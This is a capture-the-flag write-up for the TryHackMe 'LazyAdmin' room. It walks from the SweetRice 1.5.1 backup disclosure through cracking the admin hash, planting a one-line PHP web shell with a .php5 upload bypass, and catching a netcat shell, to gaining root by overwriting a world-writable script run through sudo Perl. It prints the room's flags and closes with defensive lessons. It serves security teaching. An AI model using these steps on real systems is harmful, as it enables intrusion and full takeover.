---
title: "LazyAdmin"
description: "A beginner-friendly room exploiting SweetRice CMS backup disclosure, password cracking, and a misconfigured sudo-permitted Perl script for root privilege escalation."
difficulty: "Easy"
tags: ["SweetRice", "CMS", "Backup Disclosure", "PHP Reverse Shell", "Sudo", "Perl", "CrackStation"]
date: "2026-07-29"
---

## Overview

LazyAdmin is a TryHackMe room that demonstrates how a single misconfiguration can cascade into full system compromise. The target runs an outdated SweetRice CMS installation with an exposed MySQL backup directory. The backup leaks administrator credentials, granting access to the CMS admin panel where a PHP reverse shell can be uploaded. Once on the box, a misconfigured sudo entry allows running a Perl script as root — and that script executes a world-writable shell script.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** CMS enumeration, backup disclosure, password cracking, PHP reverse shells, sudo privilege escalation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
```

![Nmap scan results](/assets/screenshots/lazyadmin/nmap.png)

Two ports are open:

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.18 |

### Web Enumeration

The Apache default page on port 80 revealed nothing interesting. Directory enumeration with gobuster uncovered a `/content` directory:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Gobuster results](/assets/screenshots/lazyadmin/gobuster.png)

Navigating to `/content` revealed the SweetRice CMS installation:

![SweetRice CMS](/assets/screenshots/lazyadmin/content_page.png)

Further enumeration of `/content` uncovered several subdirectories:

```bash
gobuster dir -u http://<target-ip>/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Content subdirectories](/assets/screenshots/lazyadmin/content_dirs.png)

Key directories identified:
- `/content/as/` — Admin login panel
- `/content/inc/` — Includes with a `mysql_backup` subdirectory

### Identifying the CMS Version

The version was found in `/content/inc/latest.txt`: **SweetRice 1.5.1**.

### Vulnerability Research

SweetRice 1.5.1 has a known backup disclosure vulnerability (Exploit-DB 40718) that exposes MySQL database backups at:

```
http://<target-ip>/content/inc/mysql_backup/
```

![MySQL backup directory](/assets/screenshots/lazyadmin/mysql_backup.png)

## Initial Access

### Extracting Credentials

The SQL backup file was downloaded and inspected:

```bash
wget http://<target-ip>/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
```

![SQL backup contents](/assets/screenshots/lazyadmin/sql_analysis.png)

The backup contained a serialized PHP options entry with administrator credentials:

```
s:5:"admin";s:7:"manager";s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb";
```

The hash `42f749ade7f9e195bf475f37a44cafcb` was identified as MD5 and cracked via CrackStation:

![Hash cracked to Password123](/assets/screenshots/lazyadmin/hash_cracked.png)

**Credentials:** `manager` : `Password123`

### Admin Panel Login

The admin panel at `/content/as/` accepted the credentials:

![Admin login page](/assets/screenshots/lazyadmin/login_page.png)

![SweetRice admin dashboard](/assets/screenshots/lazyadmin/admin_dashboard.png)

### Uploading a Reverse Shell

The **Media Center** or **Ads** sections in the dashboard allow uploading or creating PHP files. A PentestMonkey PHP reverse shell was uploaded with a `.php5` extension (SweetRice blocks `.php` but accepts `.php5`):

```php
<?php
// PentestMonkey PHP reverse shell with IP and port configured
?>
```

Alternatively, the **Ads** section allows pasting PHP code directly. A reverse shell was created there:

```php
<pre><?php system($_GET['cmd']); ?></pre>
```

A netcat listener was started on the attack machine:

```bash
nc -lvnp 4444
```

The reverse shell was triggered by navigating to the uploaded file at `/content/attachment/shell.php5` or `/content/inc/ads/shell.php`.

![Reverse shell received](/assets/screenshots/lazyadmin/rev_shell.png)

The shell came back as `www-data`.

### User Flag

```bash
cat /home/itguy/user.txt
```

![User flag](/assets/screenshots/lazyadmin/user_flag.png)

**User flag:** `THM{63e5bce9271952aad1113b6f1ac28a07}`

## Privilege Escalation

### sudo -l

Checking sudo permissions revealed:

```bash
www-data@THM-Chal:/$ sudo -l
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

![Sudo permissions](/assets/screenshots/lazyadmin/sudo_priv.png)

The `www-data` user can execute `/home/itguy/backup.pl` as root without a password.

### Analyzing backup.pl

```bash
www-data@THM-Chal:/$ cat /home/itguy/backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");
```

The script simply executes `/etc/copy.sh` via the shell.

### Checking copy.sh Permissions

```bash
www-data@THM-Chal:/$ ls -la /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

The file is world-writable (`rwx` for others). This means any user can modify it.

### Exploiting the Chain

The attack chain is:

1. Overwrite `/etc/copy.sh` with a malicious command
2. Run `sudo /usr/bin/perl /home/itguy/backup.pl`
3. The script executes the modified `copy.sh` as root

The simplest escalation is to spawn a Bash shell:

```bash
echo "/bin/bash" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

This drops directly into an interactive root shell.

### Root Flag

```bash
whoami
root
cat /root/root.txt
```

![Root flag](/assets/screenshots/lazyadmin/root_flag.png)

**Root flag:** `THM{6637f41d0177b6f37cb20d775124699f}`

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/itguy/user.txt` | `THM{63e5bce9271952aad1113b6f1ac28a07}` |
| Root | `/root/root.txt` | `THM{6637f41d0177b6f37cb20d775124699f}` |

## Commands Used

```bash
# Enumeration
nmap -sV -sC -oN nmap.txt <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<target-ip>/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Backup disclosure
wget http://<target-ip>/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
cat mysql_bakup_20191129023059-1.5.1.sql | grep passwd

# Crack hash (MD5)
echo "42f749ade7f9e195bf475f37a44cafcb" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Reverse shell
nc -lvnp 4444

# Privilege escalation
sudo -l
cat /home/itguy/backup.pl
ls -la /etc/copy.sh
echo "/bin/bash" > /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

## Lessons Learned

- **Never expose backup files.** The MySQL backup directory was publicly accessible with no authentication. Backup files often contain sensitive information like credentials and should never be placed in a web-accessible directory.
- **Hash algorithms matter.** Storing passwords as unsalted MD5 hashes means they can be cracked in seconds with an online tool like CrackStation or a wordlist attack with John. Modern applications should use bcrypt, Argon2, or PBKDF2.
- **CMS upload filters are easily bypassed.** SweetRice blocks `.php` uploads but allows `.php5` and `.phtml`. Always test alternative PHP extensions when encountering file upload restrictions.
- **Sudo rules should follow the principle of least privilege.** Granting `NOPASSWD` sudo access to a script that executes an uncontrolled file (`/etc/copy.sh`) is equivalent to granting full root access. The user running the script could modify the target file first.
- **File permissions must be audited.** The `/etc/copy.sh` script was world-writable while being executed as root. World-writable files in system directories are a clear privilege escalation vector and should never exist.
- **Chain your enumeration.** This room demonstrates that vulnerabilities are rarely isolated — a backup disclosure leads to credential discovery, which enables admin access, which enables file upload, which enables shell access, which enables privilege escalation. Each step builds on the previous one.

## References

- [TryHackMe — LazyAdmin](https://tryhackme.com/room/lazyadmin)
- [Exploit-DB 40718 — SweetRice 1.5.1 Backup Disclosure](https://www.exploit-db.com/exploits/40718)
- [Exploit-DB 40716 — SweetRice 1.5.1 Arbitrary File Upload](https://www.exploit-db.com/exploits/40716)
- [Exploit-DB 40700 — SweetRice 1.5.1 PHP Code Execution](https://www.exploit-db.com/exploits/40700)
- [CrackStation — Online Hash Cracker](https://crackstation.net/)
- [PentestMonkey — PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- [GTFOBins — Sudo](https://gtfobins.github.io/gtfobins/perl/#sudo)
- [SweetRice CMS — Basic-CMS.org](http://www.basic-cms.org/)
- [OWASP — Backup Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces)
